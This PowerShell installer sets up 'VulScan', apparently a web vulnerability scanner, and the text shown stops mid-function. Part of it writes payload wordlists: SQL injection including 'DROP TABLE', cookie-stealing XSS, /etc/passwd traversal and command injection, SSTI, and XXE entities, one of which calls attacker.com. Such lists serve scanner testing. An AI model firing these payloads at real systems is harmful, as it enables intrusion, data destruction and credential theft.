#Requires -Version 5.1
#Requires -RunAsAdministrator

<#
.SYNOPSIS
    VulScan Advanced PowerShell Installer v5.0.1 - Fixed
    
.DESCRIPTION
    Modern PowerShell installer for VulScan Web Security Scanner
    Features: Progress bars, error handling, logging, automatic updates, and more
    
.PARAMETER Version
    Version to install: Stable, Development, or Manual
    
.PARAMETER InstallPath
    Custom installation directory
    
.PARAMETER Silent
    Run installation silently without user interaction
    
.PARAMETER SkipPathUpdate
    Skip adding to PATH environment variable
    
.PARAMETER LogFile
    Custom log file location
    
.EXAMPLE
    .\VulScan-Installer.ps1
    
.EXAMPLE
    .\VulScan-Installer.ps1 -Version Development -InstallPath "D:\Tools\VulScan" -Silent
    
.NOTES
    Author: Enhanced PowerShell Version - Fixed
    Version: 5.0.1
    Requires: PowerShell 5.1+, Administrator privileges
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $false)]
    [ValidateSet("Stable", "Development", "Manual")]
    [string]$Version,
    
    [Parameter(Mandatory = $false)]
    [string]$InstallPath,
    
    [Parameter(Mandatory = $false)]
    [switch]$Silent,
    
    [Parameter(Mandatory = $false)]
    [switch]$SkipPathUpdate,
    
    [Parameter(Mandatory = $false)]
    [string]$LogFile = "$env:TEMP\VulScan-Installer.log"
)

# Global variables
$Script:Config = @{
    Version = "5.0.1"
    ProductName = "VulScan"
    Author = "ATOMGAMERAGA"
    MinPowerShellVersion = [Version]"5.1"
    MinGoVersion = [Version]"1.19"
    TempDir = "$env:TEMP\VulScan_Install_$(Get-Random)"
    DefaultInstallDir = "${env:ProgramFiles}\VulScan"
    ConfigDir = "${env:ProgramData}\VulScan"
    StartMenuDir = "${env:ProgramData}\Microsoft\Windows\Start Menu\Programs\VulScan"
    LogFile = $LogFile
    Language = "English"  # Default language
    Colors = @{
        Header = 'Cyan'
        Success = 'Green'
        Warning = 'Yellow'
        Error = 'Red'
        Info = 'White'
        Progress = 'Magenta'
    }
}

# Language strings
$Script:Strings = @{
    English = @{
        WelcomeTitle = "LANGUAGE SELECTION"
        WelcomeMessage = "Please select your preferred language:"
        LanguageOptions = @(
            "English",
            "Türkçe (Turkish)"
        )
        VersionTitle = "VERSION SELECTION"
        VersionMessage = "Which version would you like to install?"
        StableDesc = "Tested and stable main branch"
        DevelopmentDesc = "Latest features and updates"
        ManualDesc = "Use your own .exe file"
        InvalidSelection = "Invalid selection! Please choose a valid option."
        InstallSuccess = "VulScan has been successfully installed!"
        InstallDetails = "Installation Details:"
        GettingStarted = "Getting Started:"
        ExampleUsage = "Example Usage:"
        ConfigFile = "Configuration file:"
        ThankYou = "Thank you for installing VulScan! Happy scanning!"
    }
    Turkish = @{
        WelcomeTitle = "DİL SEÇİMİ"
        WelcomeMessage = "Lütfen tercih ettiğiniz dili seçin:"
        LanguageOptions = @(
            "İngilizce (English)",
            "Türkçe"
        )
        VersionTitle = "SÜRÜM SEÇİMİ"
        VersionMessage = "Hangi sürümü yüklemek istiyorsunuz?"
        StableDesc = "Test edilmiş ve kararlı ana dal"
        DevelopmentDesc = "En son özellikler ve güncellemeler"
        ManualDesc = "Kendi .exe dosyanızı kullanın"
        InvalidSelection = "Geçersiz seçim! Lütfen geçerli bir seçenek seçin."
        InstallSuccess = "VulScan başarıyla yüklendi!"
        InstallDetails = "Kurulum Detayları:"
        GettingStarted = "Başlangıç:"
        ExampleUsage = "Örnek Kullanım:"
        ConfigFile = "Yapılandırma dosyası:"
        ThankYou = "VulScan'i yüklediğiniz için teşekkürler! İyi taramalar!"
    }
}

# Version configurations
$Script:Versions = @{
    Stable = @{
        Url = "https://raw.githubusercontent.com/ATOMGAMERAGA/VulScan/main/main.go"
        Tag = "v3.0-stable"
        Description = "Tested and stable main branch"
    }
    Development = @{
        Url = "https://raw.githubusercontent.com/ATOMGAMERAGA/VulScan/main/dev/main-4.0.0.go"
        Tag = "v4.1.0-dev"
        Description = "Latest features and updates"
    }
}

# Enhanced logging function
function Write-Log {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message,
        
        [Parameter(Mandatory = $false)]
        [ValidateSet('Info', 'Warning', 'Error', 'Success', 'Debug')]
        [string]$Level = 'Info'
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    
    # Write to log file
    try {
        Add-Content -Path $Script:Config.LogFile -Value $logEntry -ErrorAction SilentlyContinue
    }
    catch {
        # Silently continue if logging fails
    }
    
    # Write to console with colors
    if (-not $Silent) {
        switch ($Level) {
            'Success' { Write-Host "✅ $Message" -ForegroundColor $Script:Config.Colors.Success }
            'Warning' { Write-Host "⚠️  $Message" -ForegroundColor $Script:Config.Colors.Warning }
            'Error' { Write-Host "❌ $Message" -ForegroundColor $Script:Config.Colors.Error }
            'Info' { Write-Host "ℹ️  $Message" -ForegroundColor $Script:Config.Colors.Info }
            'Debug' { 
                if ($VerbosePreference -ne 'SilentlyContinue') {
                    Write-Host "🔍 $Message" -ForegroundColor Gray
                }
            }
        }
    }
}

# Enhanced progress bar
function Show-Progress {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Activity,
        
        [Parameter(Mandatory = $true)]
        [string]$Status,
        
        [Parameter(Mandatory = $true)]
        [int]$PercentComplete,
        
        [Parameter(Mandatory = $false)]
        [int]$Id = 1
    )
    
    if (-not $Silent) {
        Write-Progress -Id $Id -Activity $Activity -Status $Status -PercentComplete $PercentComplete
    }
}

# Display header with ASCII art
# Language selection function
function Select-Language {
    if ($Silent) {
        return "English"
    }
    
    Clear-Host
    
    $header = @"
  ██╗   ██╗██╗   ██╗██╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
  ██║   ██║██║   ██║██║     ██╔════╝██╔════╝██╔══██╗████╗  ██║
  ██║   ██║██║   ██║██║     ███████╗██║     ███████║██╔██╗ ██║
  ╚██╗ ██╔╝██║   ██║██║     ╚════██║██║     ██╔══██║██║╚██╗██║
   ╚████╔╝ ╚██████╔╝███████╗███████║╚██████╗██║  ██║██║ ╚████║
    ╚═══╝   ╚═════╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝

            VulScan PowerShell Installer v$($Script:Config.Version)
              Advanced Web Security Scanner
                 by $($Script:Config.Author)
"@
    
    Write-Host $header -ForegroundColor $Script:Config.Colors.Header
    Write-Host ("═" * 70) -ForegroundColor $Script:Config.Colors.Header
    Write-Host ""
    Write-Host ("═" * 70) -ForegroundColor $Script:Config.Colors.Header
    Write-Host "                    LANGUAGE SELECTION" -ForegroundColor $Script:Config.Colors.Header
    Write-Host ("═" * 70) -ForegroundColor $Script:Config.Colors.Header
    Write-Host ""
    Write-Host "Please select your preferred language:" -ForegroundColor $Script:Config.Colors.Info
    Write-Host "Lütfen tercih ettiğiniz dili seçin:" -ForegroundColor $Script:Config.Colors.Info
    Write-Host ""
    
    Write-Host "[1] " -ForegroundColor $Script:Config.Colors.Progress -NoNewline
    Write-Host "English" -ForegroundColor $Script:Config.Colors.Success
    Write-Host ""
    Write-Host "[2] " -ForegroundColor $Script:Config.Colors.Progress -NoNewline
    Write-Host "Türkçe (Turkish)" -ForegroundColor $Script:Config.Colors.Success
    Write-Host ""
    
    do {
        $choice = Read-Host "Select your choice / Seçiminizi yapın (1/2)"
        switch ($choice) {
            "1" { 
                $Script:Config.Language = "English"
                return "English" 
            }
            "2" { 
                $Script:Config.Language = "Turkish"
                return "Turkish" 
            }
            default { 
                Write-Host "Invalid selection! Please choose 1 or 2." -ForegroundColor $Script:Config.Colors.Error
                Write-Host "Geçersiz seçim! Lütfen 1 veya 2 seçin." -ForegroundColor $Script:Config.Colors.Error
            }
        }
    } while ($true)
}

# Get localized string
function Get-String {
    param([string]$Key)
    
    $language = $Script:Config.Language
    if ($Script:Strings[$language] -and $Script:Strings[$language][$Key]) {
        return $Script:Strings[$language][$Key]
    }
    # Fallback to English if key not found
    return $Script:Strings["English"][$Key]
}

function Show-Header {
    if ($Silent) { return }
    
    Clear-Host
    
    $header = @"
  ██╗   ██╗██╗   ██╗██╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
  ██║   ██║██║   ██║██║     ██╔════╝██╔════╝██╔══██╗████╗  ██║
  ██║   ██║██║   ██║██║     ███████╗██║     ███████║██╔██╗ ██║
  ╚██╗ ██╔╝██║   ██║██║     ╚════██║██║     ██╔══██║██║╚██╗██║
   ╚████╔╝ ╚██████╔╝███████╗███████║╚██████╗██║  ██║██║ ╚████║
    ╚═══╝   ╚═════╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝

            VulScan PowerShell Installer v$($Script:Config.Version)
              Advanced Web Security Scanner
                 by $($Script:Config.Author)
"@
    
    Write-Host $header -ForegroundColor $Script:Config.Colors.Header
    Write-Host ("═" * 70) -ForegroundColor $Script:Config.Colors.Header
    Write-Host ""
}

# System requirements check
function Test-SystemRequirements {
    Write-Log "Checking system requirements..." -Level Info
    Show-Progress -Activity "System Check" -Status "Verifying requirements..." -PercentComplete 10
    
    $issues = @()
    
    # Check PowerShell version
    if ($PSVersionTable.PSVersion -lt $Script:Config.MinPowerShellVersion) {
        $issues += "PowerShell $($Script:Config.MinPowerShellVersion) or higher required. Current: $($PSVersionTable.PSVersion)"
    }
    
    # Check administrator privileges
    $currentPrincipal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        $issues += "Administrator privileges required"
    }
    
    # Check available disk space (minimum 100MB)
    $installDrive = ($Script:Config.DefaultInstallDir -split ':')[0] + ':'
    try {
        $freeSpace = (Get-WmiObject -Class Win32_LogicalDisk -Filter "DeviceID='$installDrive'").FreeSpace
        if ($freeSpace -lt 100MB) {
            $issues += "Insufficient disk space. At least 100MB required on $installDrive"
        }
    }
    catch {
        Write-Log "Warning: Could not check disk space" -Level Warning
    }
    
    # Check internet connectivity
    try {
        $null = Test-NetConnection -ComputerName "github.com" -Port 443 -InformationLevel Quiet -ErrorAction Stop
    }
    catch {
        $issues += "Internet connection required to download VulScan source code"
    }
    
    if ($issues.Count -gt 0) {
        Write-Log "System requirements check failed:" -Level Error
        foreach ($issue in $issues) {
            Write-Log "  - $issue" -Level Error
        }
        throw "System requirements not met"
    }
    
    Write-Log "System requirements check passed" -Level Success
    Show-Progress -Activity "System Check" -Status "Requirements verified" -PercentComplete 25
}

# Check and install Go if needed
function Install-Go {
    Write-Log "Checking Go installation..." -Level Info
    Show-Progress -Activity "Go Installation" -Status "Checking Go..." -PercentComplete 30
    
    try {
        $goVersion = & go version 2>$null
        if ($LASTEXITCODE -eq 0) {
            $versionString = ($goVersion -split ' ')[2].TrimStart('go')
            $currentVersion = [Version]($versionString -replace 'go', '')
            
            if ($currentVersion -ge $Script:Config.MinGoVersion) {
                Write-Log "Go $versionString found and compatible" -Level Success
                return
            }
        }
    }
    catch {
        # Go not found
    }
    
    Write-Log "Go not found or incompatible version" -Level Warning
    
    if ($Silent) {
        throw "Go $($Script:Config.MinGoVersion) or higher required for automatic installation"
    }
    
    $installGo = Read-Host "Would you like to download and install Go automatically? (Y/N)"
    if ($installGo -match '^[Yy]') {
        Install-GoRuntime
    }
    else {
        Write-Log "Please install Go manually from https://golang.org/dl/" -Level Info
        Write-Log "After installation, run this installer again or choose manual installation" -Level Info
        throw "Go installation required"
    }
}

# Download and install Go
function Install-GoRuntime {
    Write-Log "Downloading Go installer..." -Level Info
    Show-Progress -Activity "Go Installation" -Status "Downloading Go..." -PercentComplete 35
    
    $architecture = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
    $goUrl = "https://golang.org/dl/go1.21.0.windows-$architecture.msi"
    $goInstaller = "$env:TEMP\go-installer.msi"
    
    try {
        Invoke-WebRequest -Uri $goUrl -OutFile $goInstaller -UserAgent "VulScan-Installer/$($Script:Config.Version)"
        
        Write-Log "Installing Go..." -Level Info
        Show-Progress -Activity "Go Installation" -Status "Installing Go..." -PercentComplete 45
        
        $process = Start-Process -FilePath "msiexec.exe" -ArgumentList "/i", $goInstaller, "/quiet", "/norestart" -Wait -PassThru
        
        if ($process.ExitCode -eq 0) {
            Write-Log "Go installed successfully" -Level Success
            # Refresh environment variables
            $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path", "User")
        }
        else {
            throw "Go installation failed with exit code: $($process.ExitCode)"
        }
    }
    catch {
        Write-Log "Failed to install Go: $($_.Exception.Message)" -Level Error
        throw
    }
    finally {
        if (Test-Path $goInstaller) {
            Remove-Item $goInstaller -Force -ErrorAction SilentlyContinue
        }
    }
}

# Version selection menu
function Select-Version {
    if ($Version) {
        return $Version
    }
    
    if ($Silent) {
        return "Stable"
    }
    
    Write-Host ""
    Write-Host ("═" * 70) -ForegroundColor $Script:Config.Colors.Header
    Write-Host "                    $(Get-String 'VersionTitle')" -ForegroundColor $Script:Config.Colors.Header
    Write-Host ("═" * 70) -ForegroundColor $Script:Config.Colors.Header
    Write-Host ""
    Write-Host (Get-String 'VersionMessage') -ForegroundColor $Script:Config.Colors.Info
    Write-Host ""
    
    $options = @(
        @{
            Number = 1
            Name = "Stable"
            Description = (Get-String 'StableDesc')
            Tag = $Script:Versions.Stable.Tag
        },
        @{
            Number = 2
            Name = "Development"
            Description = (Get-String 'DevelopmentDesc')
            Tag = $Script:Versions.Development.Tag
        },
        @{
            Number = 3
            Name = "Manual"
            Description = (Get-String 'ManualDesc')
            Tag = "manual"
        }
    )
    
    foreach ($option in $options) {
        Write-Host "[$($option.Number)] " -ForegroundColor $Script:Config.Colors.Progress -NoNewline
        Write-Host "$($option.Name) ($($option.Tag))" -ForegroundColor $Script:Config.Colors.Success
        Write-Host "    └─ $($option.Description)" -ForegroundColor Gray
        Write-Host ""
    }
    
    do {
        $choice = Read-Host "Select your choice (1/2/3)"
        switch ($choice) {
            "1" { return "Stable" }
            "2" { return "Development" }
            "3" { return "Manual" }
            default { 
                Write-Host (Get-String 'InvalidSelection') -ForegroundColor $Script:Config.Colors.Error
            }
        }
    } while ($true)
}

# Download and compile VulScan
function Install-VulScan {
    param([string]$SelectedVersion)
    
    Write-Log "Installing VulScan $SelectedVersion version..." -Level Info
    
    # Create temporary directory
    if (Test-Path $Script:Config.TempDir) {
        Remove-Item $Script:Config.TempDir -Recurse -Force
    }
    New-Item -ItemType Directory -Path $Script:Config.TempDir -Force | Out-Null
    
    if ($SelectedVersion -eq "Manual") {
        Install-ManualVersion
        return
    }
    
    $versionConfig = $Script:Versions[$SelectedVersion]
    
    # Download source code
    Write-Log "Downloading source code from GitHub..." -Level Info
    Show-Progress -Activity "VulScan Installation" -Status "Downloading source code..." -PercentComplete 50
    
    $sourcePath = Join-Path $Script:Config.TempDir "main.go"
    
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "VulScan-Installer/$($Script:Config.Version)")
        $webClient.DownloadFile($versionConfig.Url, $sourcePath)
    }
    catch {
        Write-Log "Failed to download source code: $($_.Exception.Message)" -Level Error
        throw
    }
    
    # Create go.mod file
    Write-Log "Preparing Go module..." -Level Info
    Show-Progress -Activity "VulScan Installation" -Status "Preparing Go module..." -PercentComplete 60
    
    $goModContent = @"
module VulScan

go 1.19

require (
    golang.org/x/time v0.3.0
    gopkg.in/yaml.v3 v3.0.1
)
"@
    
    Set-Content -Path (Join-Path $Script:Config.TempDir "go.mod") -Value $goModContent
    
    # Download dependencies and build
    Push-Location $Script:Config.TempDir
    try {
        Write-Log "Downloading Go dependencies..." -Level Info
        Show-Progress -Activity "VulScan Installation" -Status "Downloading dependencies..." -PercentComplete 65
        
        $null = & go mod tidy 2>&1
        
        # Build executable
        Write-Log "Compiling VulScan..." -Level Info
        Show-Progress -Activity "VulScan Installation" -Status "Compiling executable..." -PercentComplete 75
        
        $buildArgs = @(
            "build"
            "-ldflags", "-s -w -X main.Version=$($versionConfig.Tag)"
            "-o", "vulscan.exe"
            "main.go"
        )
        
        $buildProcess = Start-Process -FilePath "go" -ArgumentList $buildArgs -Wait -PassThru -NoNewWindow
        
        if ($buildProcess.ExitCode -ne 0) {
            throw "Compilation failed with exit code: $($buildProcess.ExitCode)"
        }
        
        if (-not (Test-Path "vulscan.exe")) {
            throw "Executable not created"
        }
        
        Write-Log "VulScan compiled successfully" -Level Success
    }
    finally {
        Pop-Location
    }
}

# Manual installation handler
function Install-ManualVersion {
    Write-Log "Manual installation mode selected" -Level Info
    
    if ($Silent) {
        throw "Manual installation not supported in silent mode"
    }
    
    Write-Host ""
    Write-Host ("═" * 70) -ForegroundColor $Script:Config.Colors.Header
    Write-Host "                    MANUAL INSTALLATION" -ForegroundColor $Script:Config.Colors.Header
    Write-Host ("═" * 70) -ForegroundColor $Script:Config.Colors.Header
    Write-Host ""
    
    $currentDir = Split-Path -Parent $MyInvocation.ScriptName
    $exePath = Join-Path $currentDir "vulscan.exe"
    
    Write-Host "Please place 'vulscan.exe' in: " -ForegroundColor $Script:Config.Colors.Info -NoNewline
    Write-Host $currentDir -ForegroundColor $Script:Config.Colors.Progress
    Write-Host ""
    
    do {
        Read-Host "Press Enter when ready"
        
        if (Test-Path $exePath) {
            # Copy to temp directory for further processing
            Copy-Item $exePath (Join-Path $Script:Config.TempDir "vulscan.exe")
            Write-Log "Manual executable found and copied" -Level Success
            break
        }
        else {
            Write-Host "vulscan.exe not found! Please place the file in the specified directory." -ForegroundColor $Script:Config.Colors.Error
        }
    } while ($true)
}

# Create installation directories and copy files
function Install-Files {
    Write-Log "Creating installation directories..." -Level Info
    Show-Progress -Activity "File Installation" -Status "Creating directories..." -PercentComplete 80
    
    # Set installation path
    $installDir = if ($InstallPath) { $InstallPath } else { $Script:Config.DefaultInstallDir }
    $configDir = $Script:Config.ConfigDir
    $payloadsDir = Join-Path $configDir "payloads"
    
    # Remove existing installation
    if (Test-Path $installDir) {
        Write-Log "Removing existing installation..." -Level Info
        Remove-Item $installDir -Recurse -Force -ErrorAction SilentlyContinue
    }
    
    # Create directories
    $directories = @($installDir, $configDir, $payloadsDir, $Script:Config.StartMenuDir)
    foreach ($dir in $directories) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }
    
    # Copy executable
    Write-Log "Installing VulScan executable..." -Level Info
    Show-Progress -Activity "File Installation" -Status "Copying files..." -PercentComplete 85
    
    $sourceExe = Join-Path $Script:Config.TempDir "vulscan.exe"
    $targetExe = Join-Path $installDir "vulscan.exe"
    Copy-Item $sourceExe $targetExe -Force
    
    # Create batch wrapper
    $batchContent = @"
@echo off
"$targetExe" %*
"@
    Set-Content -Path (Join-Path $installDir "vuls.bat") -Value $batchContent
    
    # Create PowerShell module wrapper
    $psModuleContent = @"
function Invoke-VulScan {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromRemainingArguments = `$true)]
        [string[]]`$Arguments
    )
    
    & "$targetExe" @Arguments
}

Set-Alias -Name vulscan -Value Invoke-VulScan
Set-Alias -Name vuls -Value Invoke-VulScan

Export-ModuleMember -Function Invoke-VulScan -Alias vulscan, vuls
"@
    
    $moduleDir = Join-Path $installDir "PowerShell"
    New-Item -ItemType Directory -Path $moduleDir -Force | Out-Null
    Set-Content -Path (Join-Path $moduleDir "VulScan.psm1") -Value $psModuleContent
    
    # Store installation info for later use
    $Script:InstallationPaths = @{
        InstallDir = $installDir
        ConfigDir = $configDir
        PayloadsDir = $payloadsDir
        ExecutablePath = $targetExe
    }
}

# Create configuration files and payloads
function New-ConfigurationFiles {
    Write-Log "Creating configuration files..." -Level Info
    Show-Progress -Activity "Configuration" -Status "Creating config files..." -PercentComplete 90
    
    $configDir = $Script:InstallationPaths.ConfigDir
    $payloadsDir = $Script:InstallationPaths.PayloadsDir
    
    # Create main config file
    $configContent = @"
# VulScan Configuration File
# Generated by PowerShell Installer v$($Script:Config.Version)
# $(Get-Date)

scan:
  threads: 5
  timeout: 10
  user_agent: "VulScan/PowerShell-$($Script:Config.Version)"
  rate_limit: 10
  follow_redirects: true
  verify_ssl: false

payloads:
  sql_injection: "$payloadsDir\sql.txt"
  xss: "$payloadsDir\xss.txt"
  directory_traversal: "$payloadsDir\lfi.txt"
  command_injection: "$payloadsDir\cmd.txt"
  xxe: "$payloadsDir\xxe.txt"
  ssti: "$payloadsDir\ssti.txt"

output:
  verbose: false
  format: "json"
  report: false
  colors: true
  
logging:
  enabled: true
  level: "info"
  file: "$configDir\vulscan.log"

updates:
  check_on_startup: true
  auto_update_payloads: false
"@
    
    Set-Content -Path (Join-Path $configDir "config.yaml") -Value $configContent
    
    # Create enhanced payload files with proper string handling
    $payloads = @{
        "sql.txt" = @(
            "# SQL Injection Payloads - Enhanced Set"
            "' OR '1'='1"
            "' OR 1=1 --"
            "' UNION SELECT NULL--"
            "'; DROP TABLE users; --"
            "' AND SLEEP(5) --"
            "' OR IF(1=1,SLEEP(5),0) --"
            "admin'--"
            "admin' #"
            ") or '1'='1--"
            "' OR '1'='1' /*"
            "1' ORDER BY 1--+"
            "1' ORDER BY 2--+"
            "1' ORDER BY 3--+"
            "1' UNION SELECT 1--+"
            "1' UNION SELECT 1,2--+"
            "1' UNION SELECT 1,2,3--+"
        )
        
        "xss.txt" = @(
            "# XSS Payloads - Enhanced Set"
            "<script>alert('XSS')</script>"
            "<script>alert(document.cookie)</script>"
            "<img src=x onerror=alert('XSS')>"
            "<svg onload=alert('XSS')>"
            "javascript:alert('XSS')"
            "'><script>alert('XSS')</script>"
            '"><script>alert("XSS")</script>'
            "<iframe src=javascript:alert('XSS')>"
            "<body onload=alert('XSS')>"
            "<input onfocus=alert('XSS') autofocus>"
            "<select onfocus=alert('XSS') autofocus>"
            "<textarea onfocus=alert('XSS') autofocus>"
            "<keygen onfocus=alert('XSS') autofocus>"
            "<video><source onerror=alert('XSS')>"
        )
        
        "lfi.txt" = @(
            "# Directory Traversal / LFI Payloads"
            "../"
            "..\"
            "../../../etc/passwd"
            "..\..\..\windows\system32\drivers\etc\hosts"
            "....//....//....//etc/passwd"
            "....\\....\\....\\windows\system32\drivers\etc\hosts"
            "%2e%2e%2f"
            "%2e%2e%5c"
            "..%2f"
            "..%5c"
            "%2e%2e/"
            "%2e%2e\"
        )
        
        "cmd.txt" = @(
            "# Command Injection Payloads"
            "; ls"
            "| id"
            "& whoami"
            '`id`'
            '$(id)'
            "; cat /etc/passwd"
            "| type c:\windows\system32\drivers\etc\hosts"
            "& dir"
            "; uname -a"
            "|| id"
            "&& id"
            "; sleep 5"
            "| ping -c 4 127.0.0.1"
        )
        
        "xxe.txt" = @(
            "# XXE (XML External Entity) Payloads"
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>'
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/malicious.xml">]><foo>&xxe;</foo>'
        )
        
        "ssti.txt" = @(
            "# Server-Side Template Injection Payloads"
            "{{7*7}}"
            "{{7*'7'}}"
            '${7*7}'
            "#{7*7}"
            "<%= 7*7 %>"
            "${{7*7}}"
            "{{config.items()}}"
            "{{''.__class__.__mro__[2].__subclasses__()}}"
            "{%for c in [1,2,3]%}{{c,c,c}}{%endfor%}"
        )
    }
    
    foreach ($payloadFile in $payloads.Keys) {
        $content = $payloads[$payloadFile] -join "`r`n"
        Set-Content -Path (Join-Path $payloadsDir $payloadFile) -Value $content -Encoding UTF8
    }
    
    Write-Log "Configuration files created successfully" -Level Success
}

# Update PATH environment variable
function Update-PathVariable {
    if ($SkipPathUpdate) {
        Write-Log "Skipping PATH update as requested" -Level Info
        return
    }
    
    Write-Log "Updating PATH environment variable..." -Level Info
    Show-Progress -Activity "Environment Setup" -Status "Updating PATH..." -PercentComplete 92
    
    $installDir = $Script:InstallationPaths.InstallDir
    
    try {
        # Get current PATH
        $currentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
        
        # Check if already in PATH
        if ($currentPath -split ';' -contains $installDir) {
            Write-Log "Installation directory already in PATH" -Level Info
            return
        }
        
        # Add to PATH
        $newPath = if ($currentPath.EndsWith(';')) {
            "$currentPath$installDir"
        } else {
            "$currentPath;$installDir"
        }
        
        [Environment]::SetEnvironmentVariable("PATH", $newPath, "Machine")
        
        # Update current session PATH
        $env:PATH = "$env:PATH;$installDir"
        
        Write-Log "PATH updated successfully" -Level Success
    }
    catch {
        Write-Log "Failed to update PATH: $($_.Exception.Message)" -Level Warning
        Write-Log "You may need to add $installDir to PATH manually" -Level Warning
    }
}

# Create shortcuts and Start Menu entries
function New-Shortcuts {
    Write-Log "Creating shortcuts and Start Menu entries..." -Level Info
    Show-Progress -Activity "Shortcuts Creation" -Status "Creating shortcuts..." -PercentComplete 95
    
    $installDir = $Script:InstallationPaths.InstallDir
    $exePath = $Script:InstallationPaths.ExecutablePath
    $startMenuDir = $Script:Config.StartMenuDir
    
    # Create COM object for shortcuts
    $shell = New-Object -ComObject WScript.Shell
    
    try {
        # Main VulScan shortcut
        $mainShortcut = $shell.CreateShortcut((Join-Path $startMenuDir "VulScan.lnk"))
        $mainShortcut.TargetPath = $exePath
        $mainShortcut.WorkingDirectory = $installDir
        $mainShortcut.Description = "VulScan - Web Security Scanner"
        $mainShortcut.IconLocation = "$exePath,0"
        $mainShortcut.Save()
        
        # PowerShell with VulScan loaded
        $psShortcut = $shell.CreateShortcut((Join-Path $startMenuDir "VulScan PowerShell.lnk"))
        $psShortcut.TargetPath = "powershell.exe"
        $psShortcut.Arguments = "-NoExit -Command `"Import-Module '$moduleDir\VulScan.psm1'; Write-Host 'VulScan PowerShell Module Loaded' -ForegroundColor Green`""
        $psShortcut.WorkingDirectory = $installDir
        $psShortcut.Description = "PowerShell with VulScan Module"
        $psShortcut.Save()
        
        # Configuration folder shortcut
        $configShortcut = $shell.CreateShortcut((Join-Path $startMenuDir "VulScan Configuration.lnk"))
        $configShortcut.TargetPath = $Script:InstallationPaths.ConfigDir
        $configShortcut.Description = "VulScan Configuration Directory"
        $configShortcut.Save()
        
        Write-Log "Shortcuts created successfully" -Level Success
    }
    catch {
        Write-Log "Failed to create shortcuts: $($_.Exception.Message)" -Level Warning
    }
    finally {
        # Release COM object
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($shell) | Out-Null
    }
}

# Create uninstaller
function New-Uninstaller {
    Write-Log "Creating uninstaller..." -Level Info
    
    $installDir = $Script:InstallationPaths.InstallDir
    $uninstallerPath = Join-Path $installDir "Uninstall-VulScan.ps1"
    
    $uninstallerContent = @"
#Requires -Version 5.1
#Requires -RunAsAdministrator

<#
.SYNOPSIS
    VulScan Uninstaller
.DESCRIPTION
    Removes VulScan installation completely
#>

[CmdletBinding()]
param(
    [switch]`$Force
)

`$ErrorActionPreference = 'SilentlyContinue'

Write-Host "VulScan Uninstaller" -ForegroundColor Cyan
Write-Host ("=" * 50) -ForegroundColor Cyan

if (-not `$Force) {
    `$confirm = Read-Host "Are you sure you want to uninstall VulScan? (Y/N)"
    if (`$confirm -notmatch '^[Yy]') {
        Write-Host "Uninstall cancelled." -ForegroundColor Yellow
        exit 0
    }
}

Write-Host "Uninstalling VulScan..." -ForegroundColor Yellow

# Remove from PATH
try {
    `$currentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
    `$newPath = (`$currentPath -split ';' | Where-Object { `$_ -ne "$installDir" }) -join ';'
    [Environment]::SetEnvironmentVariable("PATH", `$newPath, "Machine")
    Write-Host "✅ Removed from PATH" -ForegroundColor Green
}
catch {
    Write-Host "⚠️  Could not remove from PATH" -ForegroundColor Yellow
}

# Remove directories
`$dirsToRemove = @(
    "$installDir",
    "$($Script:Config.ConfigDir)",
    "$($Script:Config.StartMenuDir)"
)

foreach (`$dir in `$dirsToRemove) {
    if (Test-Path `$dir) {
        Remove-Item `$dir -Recurse -Force
        Write-Host "✅ Removed: `$dir" -ForegroundColor Green
    }
}

Write-Host ""
Write-Host "VulScan has been successfully uninstalled." -ForegroundColor Green
Write-Host "Thank you for using VulScan!" -ForegroundColor Cyan

# Self-delete after a delay
Start-Sleep -Seconds 2
Remove-Item `$MyInvocation.MyCommand.Path -Force
"@
    
    Set-Content -Path $uninstallerPath -Value $uninstallerContent -Encoding UTF8
    Write-Log "Uninstaller created at: $uninstallerPath" -Level Success
}

# Cleanup temporary files
function Remove-TempFiles {
    Write-Log "Cleaning up temporary files..." -Level Info
    Show-Progress -Activity "Cleanup" -Status "Removing temporary files..." -PercentComplete 98
    
    if (Test-Path $Script:Config.TempDir) {
        try {
            Remove-Item $Script:Config.TempDir -Recurse -Force -ErrorAction Stop
            Write-Log "Temporary files cleaned up successfully" -Level Success
        }
        catch {
            Write-Log "Warning: Could not clean up temporary files at $($Script:Config.TempDir)" -Level Warning
        }
    }
}

# Installation summary
function Show-InstallationSummary {
    Show-Progress -Activity "Installation Complete" -Status "Finalizing..." -PercentComplete 100
    Start-Sleep -Seconds 1
    
    if (-not $Silent) {
        Write-Progress -Completed -Activity "Installation Complete"
        Clear-Host
    }
    
    Write-Host ""
    Write-Host ("═" * 70) -ForegroundColor $Script:Config.Colors.Header
    Write-Host "                    INSTALLATION COMPLETE" -ForegroundColor $Script:Config.Colors.Header
    Write-Host ("═" * 70) -ForegroundColor $Script:Config.Colors.Header
    Write-Host ""
    
    Write-Host "✅ $(Get-String 'InstallSuccess')" -ForegroundColor $Script:Config.Colors.Success
